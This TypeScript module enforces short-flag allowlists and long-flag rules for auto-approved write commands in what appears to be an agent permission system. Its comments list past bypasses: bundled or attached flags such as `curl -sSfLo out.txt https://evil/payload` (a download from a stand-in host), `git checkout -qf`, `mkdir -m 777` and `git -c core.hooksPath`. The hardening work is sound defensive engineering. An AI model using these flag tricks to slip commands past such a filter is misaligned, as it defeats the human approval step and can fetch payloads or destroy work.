/**
 * Flag safety for write-side permission groups (#960 review).
 *
 * ## Scope note: curl and `gh api` policies were REMOVED
 *
 * They lived here for the `net-read` group, which was cut from #959 after
 * three review rounds found ten bypasses, five of them curl's. `curl` has
 * roughly two hundred flags; an allowlist assembled by hand kept missing one
 * (`-D`, `-c`, `--trace`, then `-1o` where a digit flag ended the scan). The
 * benefit did not justify it — a curl escalation costs one tap, and only 28
 * of 226 measured escalations were curl.
 *
 * Their policies are deleted rather than left dead, so nothing here suggests
 * a coverage that does not exist. Tracked for a fresh derivation, against
 * curl's actual man page rather than memory, in the `net-read` follow-up, #961.
 *
 * ## Why the first attempt was wrong
 *
 * #959 expressed these boundaries as regexes over the raw segment text, each
 * requiring the flag as a whitespace/`=`/end-bounded token — `/(^|\s)-X(\s|=|$)/`
 * and friends. Every one of these then reached a 0ms auto-approval:
 *
 *     curl -XPOST https://api.example.com/records     (value ATTACHED to -X)
 *     curl -sSfLo out.txt https://evil/payload        (-o BUNDLED behind -sSfL)
 *     curl -d@payload.json https://api.example.com/x
 *     cp -rf src existing.txt                          (-f bundled behind -r)
 *     git checkout -qf develop                         (discards uncommitted work)
 *
 * getopt lets short options bundle (`-abc` === `-a -b -c`) and take their
 * value with no separator (`-XPOST`), so "the flag `-X` appears as its own
 * token" is simply not how the flag is written. A regex over raw text cannot
 * express that; it has to be tokenized.
 *
 * ## The rule here: allowlist the short flags, deny everything else
 *
 * Rather than enumerate dangerous letters — an open set, where anything
 * forgotten fails OPEN — each command family declares the short flags that
 * are SAFE. Any short-option cluster containing a letter outside that set
 * vetoes the segment, whether bundled, attached, or standalone.
 *
 * The cost is false negatives: `git add -n` (dry run, harmless) is refused
 * because `n` is not on git's safe list, so it escalates instead of
 * auto-approving. That is the correct direction to be wrong in. A missed
 * escalation is a question the user answers; a missed veto is a command that
 * ran.
 *
 * Long options are handled by two-way prefix matching against a dangerous
 * list, because git accepts unambiguous abbreviations: `--forc` must be
 * caught by the `--force` entry, and `--force-with-lease` must be too.
 *
 * The `rm`/`rmdir` families (ADR 0023) invert the long-option rule: an
 * EXACT-spelling allowlist (`safeLongFlags`) instead of the dangerous
 * denylist. For a deletion command the dangerous set is open-ended — GNU rm
 * accepts any unambiguous abbreviation, so `--recur` IS `--recursive` and
 * `--no-p` IS `--no-preserve-root` — and a denylist under-reaches on every
 * spelling nobody listed. Only exact membership fails closed.
 */

import { shellWords } from './shell-safety.ts';

/** One command family's flag policy. */
interface FlagPolicy {
  /** Matches the START of a segment, e.g. /^curl\b/. */
  readonly family: RegExp;
  /**
   * Short-option letters that are safe for this family. A cluster containing
   * anything else vetoes the segment. Deliberately an allowlist: an unknown
   * flag must fail closed.
   */
  readonly safeShortFlags: string;
  /**
   * Long options that veto, matched in BOTH prefix directions so an
   * abbreviation (`--forc`) and an extension (`--force-with-lease`) are each
   * caught by the `--force` entry. Written without the leading dashes.
   * Ignored when `safeLongFlags` is present.
   */
  readonly dangerousLongFlags: readonly string[];
  /**
   * When present, long options are EXACT-membership allowlisted instead: a
   * `--token` whose body (everything after the dashes, INCLUDING any
   * `=value`) is not literally in this set vetoes the segment, so an
   * abbreviation (`--recur`) and a value-carrying spelling (`--force=yes`)
   * both fall outside it and fail closed. Written without the leading
   * dashes. The inversion is for families whose dangerous long-option set is
   * open-ended (ADR 0023) — see the module doc.
   */
  readonly safeLongFlags?: readonly string[];
}

const FLAG_POLICIES: readonly FlagPolicy[] = [
  {
    // mkdir/touch/tee had NO policy until the final verification pass on #959,
    // so every flag on them went unchecked and `mkdir -m 777 shared` was
    // auto-approved at 0ms. Not a regression from the `net-read` cut -- they
    // never had one -- which is exactly why it survived two review rounds:
    // nothing was looking at the prefixes nobody had thought were dangerous.
    //
    // `-m`/`--mode` is the reason this entry exists: a world-writable
    // directory lets any local user plant files in it, including into a tree
    // the other write prefixes will happily write to afterwards.
    // SPLIT per command, not one family for all three. A combined entry was
    // written first and its own coverage test caught the reason it cannot
    // work: `-m` means MODE for mkdir and MODIFY-TIME for touch, so a shared
    // allowlist has to either permit `mkdir -m 777` or refuse `touch -m`.
    // The same overloaded-short-flag problem `vcs-read` documents for
    // `git branch`/`tag`/`remote`.
    family: /^mkdir\b/,
    safeShortFlags: 'pv',
    dangerousLongFlags: ['mode', 'context'],
  },
  {
    // touch: every flag selects WHICH timestamp or how to resolve the path.
    // `-r` takes a reference PATH, which `sensitive-paths.ts` inspects
    // independently of this.
    family: /^touch\b/,
    safeShortFlags: 'acmrdthf',
    dangerousLongFlags: ['no-create'],
  },
  {
    // tee: -a append, -i ignore interrupts, -p diagnose pipe errors.
    family: /^tee\b/,
    safeShortFlags: 'aip',
    dangerousLongFlags: ['output-error'],
  },
  {
    // rm/rmdir (ADR 0023): consumed only by `artifact-clean`'s veto — no
    // other group lists either prefix through this module (`scratch` covers
    // rm too, but its safety is destination proof, not flag policy). Long
    // flags are the EXACT-spelling allowlist, not the dangerous denylist:
    // GNU rm accepts unambiguous abbreviations, so `--recur`,
    // `--no-preserve-root`, `--interactive=never` and every spelling nobody
    // listed all veto by falling OUTSIDE the set.
    family: /^rm\b/,
    safeShortFlags: 'rRfv',
    dangerousLongFlags: [], // unused: safeLongFlags governs
    safeLongFlags: ['recursive', 'force', 'verbose'],
  },
  {
    family: /^rmdir\b/,
    safeShortFlags: 'pv',
    dangerousLongFlags: [], // unused: safeLongFlags governs
    safeLongFlags: ['parents', 'verbose'],
  },
  {
    // cp/mv: -f forces past a permission error. NOTE the real clobber
    // mechanism is the POSIX default, not -f -- that is handled by the
    // destination guard in `sensitive-paths.ts`, not here.
    family: /^(cp|mv)\b/,
    safeShortFlags: 'rRpavni',
    dangerousLongFlags: [
      'force',
      'no-target-directory',
      'target-directory',
      'strip-trailing-slashes',
    ],
  },
  {
    // git write subcommands. The safe set is deliberately small: -a/-m for
    // commit, -b for branch creation on checkout/switch, -A/-u for add, plus
    // quiet/verbose. Absent, and therefore vetoed: -f (force / discard),
    // -D (force-delete), -n (--no-verify on commit), -B (force-create).
    //
    // `c` is listed but currently DEAD (#962). `shell-safety.ts`'s
    // `EXEC_SCOPED_VETOES` refuses any git segment carrying a standalone `-c`
    // — it exists to stop `git -c core.hooksPath=… commit`, and cannot tell
    // that from `git switch -c newbranch`, so it blocks both. Keeping the
    // letter here documents the intent; #962 is the position-scoped fix that
    // would make it real. Do not read its presence as "git switch -c is
    // auto-approved" — it is not.
    family: /^git\b/,
    safeShortFlags: 'amAubcqv',
    dangerousLongFlags: [
      'force',
      'no-verify',
      'discard-changes',
      'hard',
      'delete',
      'prune',
      'exec',
      'upload-pack',
      'receive-pack',
      'work-tree',
      'git-dir',
      'namespace',
      'config-env',
      'ours',
      'theirs',
    ],
  },
];

/** True if `flag` and `dangerous` are prefixes of one another (either way). */
function longFlagMatches(flag: string, dangerous: string): boolean {
  // An abbreviation must be non-trivial; a bare `--` is not a flag name.
  if (flag === '') return false;
  return dangerous.startsWith(flag) || flag.startsWith(dangerous);
}

/**
 * True if a write-side segment carries a flag its family does not permit.
 *
 * Returns false for a segment matching no known family. That is safe only
 * because every prefix in a write group has a policy here — a curated write
 * prefix with no matching family would have its flags waved through entirely.
 *
 * That invariant was FALSE until the final pass on #959 (`mkdir`, `touch` and
 * `tee` had no policy, so `mkdir -m 777` was auto-approved), and the comment
 * asserted it anyway. It is now asserted by a test that walks
 * `BUILTIN_GROUPS` rather than by this sentence — see
 * `permission-groups.test.ts`, "every write prefix is covered by a flag
 * policy". Adding a prefix to a write group without adding a policy turns
 * that test red.
 */
export function hasUnsafeWriteFlag(segment: string): boolean {
  const policy = FLAG_POLICIES.find((p) => p.family.test(segment));
  if (policy === undefined) return false;

  for (const token of shellWords(segment)) {
    if (!token.startsWith('-') || token === '-' || token === '--') continue;

    if (token.startsWith('--')) {
      if (policy.safeLongFlags !== undefined) {
        // EXACT spelling or veto (ADR 0023). Compared against the WHOLE
        // token body — `--force=yes` is `force=yes`, not `force` — so an
        // abbreviated or value-carrying spelling falls outside the set and
        // fails closed, the direction the module doc requires.
        if (!policy.safeLongFlags.includes(token.slice(2))) return true;
        continue;
      }
      const name = token.slice(2).split('=')[0] ?? '';
      for (const dangerous of policy.dangerousLongFlags) {
        if (longFlagMatches(name, dangerous)) return true;
      }
      continue;
    }

    // Short-option cluster. EVERY letter is checked, and non-letters are
    // SKIPPED rather than treated as the start of an attached value.
    //
    // Stopping at the first non-letter was the obvious reading -- `-XPOST` is
    // flag `X` with value `POST` -- and it was wrong. Numeric flags exist:
    // `curl -1` is TLSv1 and `-4` is IPv4, so `curl -1o out.txt` bundles a
    // digit flag ahead of `-o` and the scan quit before ever seeing the `o`.
    // Found while probing this module after it was written to fix the same
    // class of bug one level down.
    //
    // Skipping non-letters cannot under-block, and over-blocks only a safe
    // flag carrying an ALPHABETIC attached value (`curl -AMozilla` escalates;
    // `curl -A Mozilla` does not). A dangerous flag with an attached value is
    // still caught on its own letter, before its value is ever reached --
    // `-XPOST` vetoes on `X`, `-d@payload` on `d`.
    const cluster = token.slice(1);
    for (const ch of cluster) {
      if (!/[a-zA-Z]/.test(ch)) continue;
      if (!policy.safeShortFlags.includes(ch)) return true;
    }
  }
  return false;
}
